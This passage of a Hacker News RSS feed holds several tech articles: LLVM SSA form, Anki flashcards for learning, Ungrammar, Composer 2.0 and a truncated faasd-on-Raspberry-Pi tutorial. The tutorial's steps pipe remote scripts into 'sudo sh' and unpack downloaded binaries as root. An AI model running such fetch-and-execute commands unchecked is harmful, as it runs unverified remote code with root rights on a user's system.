  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms">https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms</a></em></p>]]>
            </description>
            <link>https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms</link>
            <guid isPermaLink="false">hacker-news-small-sites-24878421</guid>
            <pubDate>Sat, 24 Oct 2020 11:07:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anki as Learning Superpower: Computer Science Edition]]>
            </title>
            <description>
<![CDATA[
Score 357 | Comments 214 (<a href="https://news.ycombinator.com/item?id=24878171">thread link</a>) | @Smaug123
<br/>
October 24, 2020 | https://www.gresearch.co.uk/article/anki-as-learning-superpower-computer-science-edition/ | <a href="https://web.archive.org/web/*/https://www.gresearch.co.uk/article/anki-as-learning-superpower-computer-science-edition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<div>
        <p><span>Life at G-Research</span>
          <span>23/10/2020</span>
        </p>
			</div>
    </div><div>
			<div>
        
        <p><em>Patrick Stevens is a Developer at G-Research.</em></p>
<p>TL;DR: <em>If you aren’t using <a href="https://apps.ankiweb.net/">Anki</a> or one of its siblings to remember what you learn, you are missing out on literal superpowers. There are specific techniques which I’ve found helpful for using it to learn maths and computer science in particular.</em></p>
<p>This post will discuss extremely briefly what Anki is, but is mainly aimed at helping the student of maths or computer science to squeeze out some extra droplets of productivity from it. If you aren’t already familiar with Anki, go and read Michael Nielsen’s post <a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> as well or instead of this one; if you’re short of time, the main value of the post to someone new to Anki is in the first one-eighth or so, up to but not including “Using Anki to thoroughly read a research paper in an unfamiliar field”. That essay gives a broad-strokes motivation for why one might want to use Anki at all. (Spoiler: it gives you a superhuman memory!)</p>
<h2 id="what-is-anki-">What is Anki?</h2>
<p><a href="https://apps.ankiweb.net/">Anki</a> is a <a href="https://en.wikipedia.org/wiki/Spaced_repetition">spaced repetition system</a>: essentially a program that shows you flashcards at intervals tailored to help you remember their contents. Such systems are based on the observation that while you can’t stop memories from decaying, repeated exposure makes the decay exponentially slower.</p>
<p>So while you need to rehearse a fact frequently when you first come to learn it, reviews can become very sparse very quickly without losing much of your hard-won memory.</p>
<p>Anki is only one such system; other implementations such as SuperMemo and Mnemosyne exist.<br>
There are also applications using the same principles for more specific goals; for example, Memrise is designed for language learning. This post is phrased in terms of Anki, because for historical reasons that’s the one I use.</p>

<p>I’ve placed this section at the start, because I believe that spaced repetition is genuinely a superpower that anyone can acquire. If I can’t hold your interest in this post, I encourage you to glance over these other resources in the hope that one of them does the trick!</p>
<ul>
<li><a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> –&nbsp; a brief introduction to various memory systems with a particular focus on Anki. The money quote: “Anki makes memory a choice”. If you choose to remember something, you can.</li>
<li><a href="https://quantum.country/">Quantum Country</a> – an introduction to quantum computation with integrated spaced-repetition flashcards, which comes with emailed reminders to use the site at intervals. Even if you have no interest in quantum computation, I recommend skimming at least the first bits of the site, so that you can see what really good flashcards based on a text can look like. (Note that some of its cards are not ideal; the site does sometimes fall into the “yes/no” pattern, with flashcards whose answer is a bald “yes” or “no”. Cards of this form aren’t as good as cards which get you to reproduce actually content-based parts of a fact.)</li>
<li><a href="https://www.supermemo.com/en/archives1990-2015/articles/20rules">The Twenty Rules of Formulating Knowledge in Learning</a> – the creator of the spaced-repetition system SuperMemo discusses how to formulate knowledge so that it sticks. Again, even if you don’t use spaced repetition, definitely read this; the advice is absolutely foundational to my understanding of how to learn. A nontrivial amount of this very blog post is essentially specialising some of these rules to the case of maths and computer science.</li>
<li><a href="https://www.reddit.com/r/medicalschoolanki/">Reddit: Medical School Anki</a>, a subreddit with almost 55,000 subscribers at the time of writing. This link is here just to demonstrate that there are fields (such as medicine) in which Anki is very popular and nowhere near as niche as it is in most areas.</li>
</ul>

<p>Absolutely crucial to the effective use of Anki for even a moderate collection of cards is that answering a card should be a single mental motion.</p>
<p>What does this mean? We’ll demonstrate with some positive and negative examples.</p>
<ul>
<li>“What is the capital of France?” is probably answered with a single mental motion: it’s just “Paris”, obtained by a simple lookup in your memory.</li>
<li>“What is 367 times 399?” is many mental motions unless you are really unusually good at mental arithmetic. Almost everyone has to carry out some algorithm to get an answer to this question.</li>
<li>“What is the composition of air?” is probably many mental motions: for example, a lookup of “which gases are in air?” and a number of motions like “what proportion of air is this specific gas?”. Or it could be the various mental motions of “Which gas is the nth most common in air, and what is its proportion in air?” as n varies.</li>
<li>“What is the most common gas in air, and what is its proportion?” is very possibly a single mental motion despite the multiple components in its answer. For me, the knowledge that “nitrogen is the most common gas in air” is intimately bound up with “78% of air is nitrogen”; to answer one question is to access the same mental lump of storage as is required to answer the other question. Of course, for someone else, this may be two distinct facts and two distinct memory lookups.</li>
</ul>
<p>A card that is answered with one mental motion may be multiple motions for someone else; and a question answered with many mental motions may become one motion after you learn some additional fact or part of the model that ties the facts together. So it’s helpful if you personally keep track of what you’re doing to answer a given card, so that you can recognise some of this structure in your own mind.</p>
<p>Any card which is multiple mental motions should be broken down into smaller chunks.</p>
<p>If you’re doing too much work to answer a card, it’s important to notice, so that you can break the card down. And don’t worry that you might “break down a card too much”; if the cards are easy, Anki will exponentially decrease how often it shows them to you. The cost of creating a card that’s too easy is almost entirely in the time it takes you to create the card in the first place; a card that’s too difficult will sap your time and energy again and again.</p>

<p>As an example, recall the <a href="https://en.wikipedia.org/wiki/Ratio_test">ratio test for convergence</a>, likely to be covered in any first course in analysis:</p>
<p><em>Let$\sum_{n=1}^{\infty} a_n$ be a complex series, with each $a_i$ nonzero.<br>
Suppose that there is $a$ such that $|\frac{a_{n+1}}{a_n}| \to a$.<br>
Then, if $a &lt; 1$ then the series converges absolutely; if $a &gt; 1$ then the series diverges.</em></p>
<p>(We’ll discuss its proof in a later section.)</p>
<p>This statement has a number of moving parts, and is definitely much too large to appear as a single card. (Remember the rule of thumb: answering a single card should be a single mental motion.)<br>
How could we formulate this statement in an Anki-friendly way?</p>
<p>My own personal Anki collection contains the following cards. (Anki does allow LaTeX, though I often optimise for speed of card creation and just use plain text, however ugly it ends up. As long as it’s easily legible, it doesn’t need to be pretty.)</p>
<ul>
<li>What conditions exist on the ratio test? (answer: nonzero, sequence of ratios has a limit)</li>
<li>When does the ratio test let us conclude something? (answer: successive ratios converge to something not equal to 1)</li>
<li>Which cases exist on the ratio test? (answer: ratios converge to less than, or greater than, 1)</li>
<li>What can we say from the ratio test if the ratios converge to something less than 1? (answer: converges absolutely)</li>
<li>What can we say from the ratio test if the ratios converge to something greater than 1? (answer: diverges)</li>
<li>What can we say from the ratio test if the ratios converge to 1? (answer: nothing)</li>
<li>Give an example where the ratio test is inconclusive. (answer: <a href="https://en.wikipedia.org/wiki/Harmonic_series_(mathematics)">harmonic series</a>)</li>
</ul>
<p>All these cards are very simple; perhaps they might look laughably simple. This is fine! Remember that Anki will rapidly stop showing you cards you already know. Crucially each card is really a single mental motion to answer.</p>
<p>Note also that information is duplicated between cards. For example, there are two cards saying in slightly different ways that the ratio test talks about when successive ratios converge to something not equal to 1. Again, it’s fine to repeat information, because cards are cheap. Here, the information is duplicated to better facilitate the links between the cards: one card is a general “when can we conclude anything”, and one card is the same information rephrased as “which cases do I need to consider to produce more information here”. Without the additional rephrasing, there’s more of a risk of developing “isolated” clusters of cards; the aim is that given just the prompt “ratio test”, I can reproduce the <em>entire</em> cluster without thinking any further.</p>
<p>And don’t forget to store key examples and counterexamples!</p>

<p>Remembering a definition is rather like remembering the statement of a theorem.<br>
Without further ado, here is my definition of a <a href="https://en.wikipedia.org/wiki/Red-black_tree">red-black tree</a>:</p>
<ul>
<li>What, imprecisely, are the colouring rules on a red-black tree? (“global; local; base-case”)</li>
<li>What are the leaves of a red-black tree? (“null, black”)</li>
<li>What is the base-case colouring rule of a red-black tree? (“leaves are black”)</li>
<li>What is the local colouring rule of a red-black tree? (“red node =&gt; black children”)</li>
<li>What is the global colouring rule of a red-black tree? (“black depth is well defined”)</li>
<li>What is the black depth of a node in a red-black tree? (“the number of black nodes encountered on a path from that node down to a leaf”)</li>
</ul>
<p>Again, there is some duplication (two cards note that the leaves of a red-black tree are coloured black), and all the cards are extremely simple. The point is to make sure not only that the actual <em>content</em> is remembered, but also that the content is interlinked enough that you can reproduce the entire definition from the single prompt “red-black tree”. Moreover, one card is explicitly structural and carries no actual content as such: the card that lists the three types of colouring rule. This card is there solely to allow me to remember which <em>cards</em> are relevant.</p>
<p>Naively, one might create instead a single card, “what is a red-black tree?”. But in my experience, this is too big. If you’re reviewing even 30 cards a day, and …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.gresearch.co.uk/article/anki-as-learning-superpower-computer-science-edition/">https://www.gresearch.co.uk/article/anki-as-learning-superpower-computer-science-edition/</a></em></p>]]>
            </description>
            <link>https://www.gresearch.co.uk/article/anki-as-learning-superpower-computer-science-edition/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24878171</guid>
            <pubDate>Sat, 24 Oct 2020 10:10:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ungrammar]]>
            </title>
            <description>
<![CDATA[
Score 149 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24878098">thread link</a>) | @todsacerdoti
<br/>
October 24, 2020 | https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html | <a href="https://web.archive.org/web/*/https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>So, what exactly does “describing syntax trees” mean and why is it useful?
When writing an IDE, one of the core data structure is the concrete syntax tree.
It is a full-fidelity tree which represents the original source code in detail, including parenthesis, comments, and whitespace.
CSTs are used for initial analysis of the language.
They are also a vocabulary type for refactors.
Although the ultimate result of a refactor is a text diff, tree modification is a more convenient internal representation.</p>

<p>At the lowest level, the CST is typically unityped: there’s some <code>Node</code> superclass, which has a collection of <code>Node</code> children and an optional <code>Node</code> parent.
On top of this raw layer, a more AST-like API is provided: <code>Struct</code> has a <code>.name()</code> and a list of <code>.fields()</code>, etc.
This typed API is huge!
For rust-analyzer, it is comprised of more than 130 <em>types</em>!
And it is also more detailed than a typical AST: <code>Struct</code> also has <code>.l_curly()</code> and <code>.r_curly()</code>.</p>
<p>What’s worse, this API changes a lot, especially at the beginning.
You may start with nesting <code>.fields()</code> directly under the <code>Struct</code>, but then introduce a <code>StructFields</code> node for everything between the curly braces to share the code with enum variants.</p>
<p>In short, writing this by hand sucks :-)
Ungrammar is a notation to concisely describe the structure of the syntax tree, which can be used by a code generator to build an API in the target language.
If you’ve heard about <a href="https://www.oilshell.org/blog/2016/12/11.html">ASDL</a>, ungrammar is ASDL for concrete syntax trees.
For rust-analyzer’s case, that means taking the following input:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>Module =
  Attr* Visibility?
  'mod' Name
  (ItemList | ';')
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>And generating the following output:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre><span>impl</span> <span>ast</span><span>::</span><span>AttrsOwner</span>      <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>VisibilityOwner</span> <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>NameOwner</span>       <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>Module</span> <span>{</span>
    <span>pub</span> <span>fn</span> <span>mod_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>item_list</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>ItemList</span><span>&gt;</span>    <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>semicolon_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In typical parser generators, something similar can be achieved by generating <em>both</em> the parser and the syntax tree from the same grammar.
This works to some extent, but has an inherent problem that the shape of the tree you want for the programmatic API, and the shape of the grammar you need to implement the parser are often different.
“Technical” transformations like left-recursion elimination don’t affect the language described by the grammar, but completely change the shape of the parse tree.
In contrast, ungrammar focuses solely on the second task, which radically reduces the complexity of the grammar.
In rust-analyzer, it is paired with a hand-written parser.</p>
<p>Treated as an ordinary (context free) grammar, ungrammar describes a superset of the language.
For example, for programmatic API it might be convenient to treat commas in comma-separate lists as a part of the list element
(rust-analyzer doesn’t do this yet, but it should).
This leads to the following ungrammar, which obviously doesn’t treat commas precisely:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>FieldList =
  '{' Field* '}'

Field:
  Name ':' Type ','?
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Similarly, ungrammar defines binary and unary expressions, but doesn’t specify their relative precedence and associativity.</p>
<p>An interesting side-effect is that the resulting grammars turn out to be pretty human readable.
For example, a full production ready Rust grammar takes about 600 short lines:<br></p>

<p>This might be a good fit for reference documentation!</p>
</div></div>]]>
            </description>
            <link>https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24878098</guid>
            <pubDate>Sat, 24 Oct 2020 09:55:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Composer 2.0 is now available]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24878068">thread link</a>) | @Y-bar
<br/>
October 24, 2020 | https://blog.packagist.com/composer-2-0-is-now-available/ | <a href="https://web.archive.org/web/*/https://blog.packagist.com/composer-2-0-is-now-available/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <h2 id="1-what-s-new">1/ What's new?</h2><p>The list of changes and improvements is long, check the <a href="https://github.com/composer/composer/releases/tag/2.0.0">complete changelog</a> if you are interested in reading it all. I will highlight a few key points here.</p><h3 id="performance-improvements">Performance improvements</h3><p>We overhauled pretty much everything from the protocol used between Composer and packagist.org to the dependency resolution, including downloading files in parallel using curl and constraint evaluation optimizations. This leads to massive improvements in terms of both speed and memory usage. The difference depends on your use case, so while I've seen reports of improvements of over 50% to both in some projects, I cannot put an exact number on it. But I am sure you will be positively surprised if you haven't tried Composer 2 yet.</p><p>As a side note to this, <code>require</code>/<code>remove</code> and partial updates are now much faster because Composer will now only load the metadata of the packages which are being changed.</p><figure><img src="https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png" alt="" srcset="https://blog.packagist.com/content/images/size/w600/2020/10/image_2020-10-24_175318.png 600w, https://blog.packagist.com/content/images/size/w1000/2020/10/image_2020-10-24_175318.png 1000w, https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png 1455w" sizes="(min-width: 1200px) 1200px"><figcaption>Time for initial update + install (bootstrapped project, empty cache) shows roughly 60% less time used by Composer 2 with ext-curl enabled</figcaption></figure><h3 id="architectural-changes-and-determinism">Architectural changes and determinism</h3><p>The way dependency updates are done internally was refactored, which, for you, will result in more deterministic updates. The current local state of the vendor directory will not interfere in updates anymore. </p><p>After an update is complete, the install process is run automatically and it will now execute all network bound operations first - and in parallel if possible. This will avoid leaving you with a half-updated vendor directory if a network error occurs midway through installation.</p><h3 id="runtime-features">Runtime features</h3><p>We added a <a href="https://getcomposer.org/doc/07-runtime.md#platform-check">platform-check step</a> when <code>vendor/autoload.php</code> gets initialized which checks the current PHP version/extensions match what is expected by your dependencies and fails hard otherwise.</p><p>There is a new class, <code>Composer\InstalledVersions</code>, which is autoloaded in every project and is available at runtime. It allows you to check which packages/versions are present at runtime of your own project.</p><p>See the <a href="https://getcomposer.org/doc/07-runtime.md">runtime docs</a> for more details.</p><p>If your code relies on any of these runtime features, you should require <code>"composer-runtime-api": "^2.0"</code> in your composer.json. This is a virtual package which is provided by Composer and will make sure people have to use Composer 2.x to install your package.</p><h3 id="error-reporting-improvements">Error reporting improvements</h3><p>Because things don't always go the way they're supposed to, we made sure to improve the error reporting shown to you when dependencies cannot be resolved. It's hard to give concrete examples here as there are a million ways this can fail but you will hopefully notice that messages are now shorter, clearer and less repetitive.</p><h3 id="partial-updates-with-temporary-constraints">Partial updates with temporary constraints</h3><p>Sometimes it can be useful to upgrade or downgrade a single package to a specific version, perhaps temporarily to test something or wait for a bug fix. You can now run <code>composer update vendor/package:1.0.*</code> for example (or <code>1.0.12</code> or any other version constraint), to run an update of only <code>vendor/package</code> to a version matching this additional constraint. This will not update your require in composer.json, and it will not mark the lock file out of date.</p><p>If you want to add/restrict a constraint but still do a full update of all dependencies, you can use <code>update --with vendor/package:1.0.*</code> which will run the update with that additional constraint.</p><h2 id="2-how-easy-is-it-to-upgrade">2/ How easy is it to upgrade?</h2><p>Our goal is that every Composer user can upgrade smoothly and swiftly. The gains are huge and we want everyone to benefit from them. To achieve that we did a few things:</p><ul><li>Composer 2.0 still supports PHP 5.3 and above, much like Composer 1.x</li><li><code>composer.lock</code> files are interoperable between versions, so you can upgrade to 2.0 and roll back easily if needed.</li><li>Most commands and arguments remain the same, and largely what you know about Composer remains true in 2.0.</li></ul><p>If you run <code>composer self-update</code> from 1.x, it will warn you that a new stable major version of Composer is available, and you can use <code>composer self-update --2</code> to migrate to it.</p><p>Should you encounter issues, you can go back at any time by using <code>composer self-update --1</code>. Hopefully that will make everyone feel comfortable to experiment with the new release.</p><p>If you are <a href="https://getcomposer.org/doc/faqs/how-to-install-composer-programmatically.md">installing Composer automatically</a> from the installer script, and wish to remain on Composer 1.x for the time being, you can also pass it a <code>--1</code> argument to prevent it from installing Composer 2.0 by default. If you do this please remember and aim to upgrade in a timely manner, as Composer 1.x will not be maintained for very long.</p><h2 id="3-backwards-compatibility-breaks">3/ Backwards compatibility breaks?</h2><p>Here are the main things likely to cause trouble with the upgrade process:</p><ul><li><strong>Plugins</strong>: This is probably going to be the major source of problems for most people. Plugins need to be updated to support Composer 2, and some of them are not ready, yet. Composer 2 will complain and fail to resolve dependencies if a plugin does not support it, so no need to overthink it, you can try it out and see how it goes.</li><li>The new <strong>platform-check feature</strong> means that Composer checks the runtime PHP version and available extensions to ensure they match the project dependencies. If a mismatch is found, the autoloader exits with error details to make sure problems are not overlooked. To avoid issues when deploying to production it is recommended to run <code>composer check-platform-reqs --no-dev</code> with the production PHP process as part of your build or deployment process.</li><li><strong>Repository priority</strong>: If a package exists in a higher priority repository, it will now be entirely ignored in lower priority repositories. If you seem to be missing packages when using Composer 2, see <a href="https://getcomposer.org/repoprio">repository priorities docs</a> for details.</li><li><strong>Invalid PSR-0 / PSR-4 configurations</strong> will not autoload anymore in optimized-autoloader mode, as per the warnings introduced in Composer 1.10. Mostly these warnings were for classes that were not meant to autoload anyway so I don't expect major issues, but it's safer to clean these up before upgrading.</li></ul><p>If you want to know more, I would highly recommend reading the <a href="https://github.com/composer/composer/blob/master/UPGRADE-2.0.md">UPGRADE</a> guide which has multiple sections for end users, plugin authors and Composer repository implementors.</p><h2 id="4-what-s-next">4/ What's next?</h2><p>We don't have a very detailed feature roadmap anymore as 2.0 contains tons of new goodies, but one important thing I want to explain is our PHP version support going forward.</p><p>As I mentioned above, Composer 2.0 supports PHP 5.3+, which is at this point very outdated and makes the code quite hard to maintain in places. We went through the effort to make sure every Composer user can upgrade to Composer 2, but the plan is to drop support for EOL PHP versions in a future minor release.</p><p>Composer 2.1 might still come with PHP 5.3 support, depending on the timeline and which features end up being included, but then at the latest by Composer 2.2 we will drop support for everything older than PHP 7.1.3. According to our stats this allows over 90% of the Composer users to use the latest version, and for the others who are stuck on outdated PHP versions we will keep providing critical bug and security fixes in the 2.0.x or 2.1.x range.</p><p>As for Composer 1.x, it is now more or less EOL. It will also receive critical fixes if anything comes up but the goal for everyone should be to migrate to 2.x as soon as possible.</p><p>Finally I want to thank everyone who contributed and helped make this a reality. The 2.0 release represents over 1100 commits from 28 people, 150+ GitHub issues and pull requests, plus everyone who test it, reviewed PRs, etc. It has been a huge effort with the first commits made about two years ago.</p><p>I also want to thank all our <a href="https://packagist.com/">Private Packagist</a> customers who helped finance this effort and afforded us the time we spent on all this. We sincerely hope everyone will appreciate the result!</p>
                </div>
            </section>


            


        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.packagist.com/composer-2-0-is-now-available/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24878068</guid>
            <pubDate>Sat, 24 Oct 2020 09:46:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Faasd – Lightweight Serverless for Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 71 | Comments 46 (<a href="https://news.ycombinator.com/item?id=24877846">thread link</a>) | @alexellisuk
<br/>
October 24, 2020 | https://blog.alexellis.io/faasd-for-lightweight-serverless/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/faasd-for-lightweight-serverless/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>Kick the tires with faasd today, for a lightweight serverless experience that doesn't require Kubernetes. Instead it uses containerd and the existing OpenFaaS ecosystem.</p>
<blockquote>
<p>Last updated: 24th October 2020 - upgraded faasd &amp; containerd versions. Added instructions for core components logs such as the gateway.</p>
</blockquote>
<p>You can run <a href="https://github.com/openfaas/faasd">faasd</a> anywhere, even on a <a href="https://www.raspberrypi.org/">Raspberry Pi</a>, but why would you want to do that? faasd offers many of the benefits of containers and <a href="https://github.com/openfaas/faas">OpenFaaS</a>, but without the complexity and operational costs of Kubernetes. <a href="https://github.com/containerd/containerd">containerd</a> is a low-level tool for automating containers, and a <a href="https://landscape.cncf.io/">CNCF project</a>.</p>
<p><img src="https://blog.alexellis.io/content/images/2019/12/ofctr.png" alt="OpenFaaS and containerd logos"></p>
<p>The use-cases for <a href="https://blog.alexellis.io/introducing-functions-as-a-service/">Serverless / FaaS are fairly well-known</a>, but you could use faasd at the edge, in a smart-car, as part of an IoT device, for crunching data before uploading samples to the cloud, for webhook receivers/alerting, bots, webservices, API integrations or even providing your own APIs. Compute is compute, and OpenFaaS with containerd makes it easy to both consume and provide.</p>
<blockquote>
<p>🚀 Support the development of faasd - <a href="https://github.com/sponsors/openfaas">Sponsor OpenFaaS on GitHub</a><br>
⭐️ Star or fork <a href="https://github.com/openfaas/faasd">faasd on GitHub</a></p>
</blockquote>
<h2 id="beforewestart">Before we start</h2>
<p>Use Raspbian Lite (now called RaspiOS) for this tutorial. Do not install Docker on the same Raspberry Pi as it may cause conflicts with networking and the version of containerd we are using.</p>
<p>You should use RPi 2, 3 or 4. If you have only one Raspberry Pi, then you'll be able to deploy pre-built images from the OpenFaaS Function Store, but if you have a second Raspberry Pi, then you can use it to build new functions too.</p>
<p>You can also deploy to a PC or cloud VM:</p>
<ul>
<li><a href="https://www.openfaas.com/blog/faasd-tls-terraform/">Deploy faasd to DigitalOcean with Terraform</a></li>
<li><a href="https://github.com/openfaas/faasd/blob/master/docs/MULTIPASS.md">Deploy faasd to your laptop with Multipass</a></li>
</ul>
<h2 id="installation">Installation</h2>
<p>Installation only takes a few moments, and in the future should be quicker if we can secure binaries for containerd from the upstream project.</p>
<h3 id="getfaascli">Get <code>faas-cli</code></h3>
<p>The <a href="https://github.com/openfaas/faas-cli/">faas-cli</a> can be used to build, deploy, manage, and invoke functions with OpenFaaS. OpenFaaS offers a REST API, asynchronous invocations, authentication, metrics, and a UI out of the box.</p>
<p>Install using the utility script, or alternatively the binaries are also available on the <a href="https://github.com/openfaas/faas-cli/releases">releases page</a>.</p>
<pre><code># Install to local directory
curl -sLfS https://cli.openfaas.com | sh
sudo mv faas-cli to /usr/local/bin

# Or run with sudo to move to /usr/local/bin in one step
curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<p>See also: <a href="https://docs.openfaas.com/">OpenFaaS docs</a></p>
<h3 id="getcontainerd">Get containerd</h3>
<p>Unfortunately the <a href="https://github.com/containerd/containerd">containerd</a> maintainers only provide binaries for <code>x86_64</code> (regular PCs), so we have to install Go and build containerd from source.</p>
<p>We'll install some dependencies that will help us in the tutorial and after installation</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    runc \
    bridge-utils \
    tmux \
    git
</code></pre>
<p>Pick option A or B.</p>
<h4 id="ausemycontainerdarmhfbinariesfast">A) Use my containerd armhf binaries (fast)</h4>
<p>I have compiled binaries for containerd, which you can use if you wish. <a href="https://github.com/alexellis/containerd-armhf/releases">alexellis/containerd/armhf</a>.</p>
<pre><code>curl -sSL https://github.com/alexellis/containerd-arm/releases/download/v1.3.5/containerd-1.3.5-linux-armhf.tar.gz | sudo tar -xvz --strip-components=1 -C /usr/local/bin/
</code></pre>
<h4 id="bbuildyourowncontainerdbinariesslow">B) Build your own containerd binaries (slow)</h4>
<p>Raspbian needs a few additional build-time dependencies for containerd:</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    build-essential \
    libbtrfs-dev \
    libseccomp-dev
</code></pre>
<p>You can use my utility script to build containerd now:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas
git clone https://github.com/openfaas/faasd

cd cd faasd

./hack/build-containerd-armhf.sh
</code></pre>
<p>This could take a few moments on RPi2 or 3, and is a little quicker on RPi4.</p>
<h3 id="configurecontainerdtostartonboot">Configure containerd to start on boot</h3>
<p>Install a systemd unit file for <code>containerd</code>:</p>
<pre><code>curl -SLfs https://raw.githubusercontent.com/containerd/containerd/v1.3.5/containerd.service | sudo tee /etc/systemd/system/containerd.service

sudo systemctl enable containerd
sudo systemctl start containerd
</code></pre>
<p>Check that <code>containerd</code> started with <code>sudo systemctl status containerd</code>, if not then you may need to <code>unmask</code> it and run the commands again. See <a href="https://blog.ruanbekker.com/blog/2017/12/09/unmask-a-masked-service-in-systemd/">unmasking a service</a>.</p>
<h3 id="installnetworking">Install networking</h3>
<ul>
<li>
<p>Enable the Kernel's bridge module</p>
<pre><code># One-off
sudo modprobe br_netfilter &amp;&amp; \
sudo sysctl net.bridge.bridge-nf-call-iptables=1

# Make it permanent
echo "br_netfilter" | sudo tee -a /etc/modules-load.d/modules.conf

echo "net.bridge.bridge-nf-call-iptables=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
</li>
<li>
<p>Install CNI plugins</p>
<p>Fortunately there are upstream ARM binaries available for the CNI plugins.</p>
<pre><code>sudo mkdir -p /opt/cni/bin

curl -sSL https://github.com/containernetworking/plugins/releases/download/v0.8.5/cni-plugins-linux-arm-v0.8.5.tgz | sudo tar -xz -C /opt/cni/bin
</code></pre>
</li>
<li>
<p>Enable NAT</p>
<p>Enable NAT between the container network and your wider network and the Internet:</p>
<pre><code>sudo /sbin/sysctl -w net.ipv4.conf.all.forwarding=1

echo "net.ipv4.conf.all.forwarding=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
<p>Optional step - if you have Docker running on your system, then disable it and reboot at this point.</p>
<pre><code>sudo systemctl disable docker
sudo systemctl disable docker.sock # or docker.socket - You may also need this step
</code></pre>
<p>Docker's IP address range conflicts with the one chosen by netns, this will be resolved when moving to CNI.</p>
</li>
</ul>
<h3 id="getfaasd">Get <code>faasd</code></h3>
<p>faasd is a Go binary that runs on your system and packages all of OpenFaaS, it's a similar tool to docker-compose.</p>
<p>One of faasd's commands <code>faasd provider</code> runs an OpenFaaS provider which implements the OpenFaaS "CRUD" API for functions.</p>
<p>Clean-up old versions, if required:</p>
<pre><code># Stop systemd services, if you have them
sudo systemctl stop faasd
sudo systemctl stop faasd-provider

# Remove old binaries if you have them
sudo rm -rf /usr/local/bin/faasd
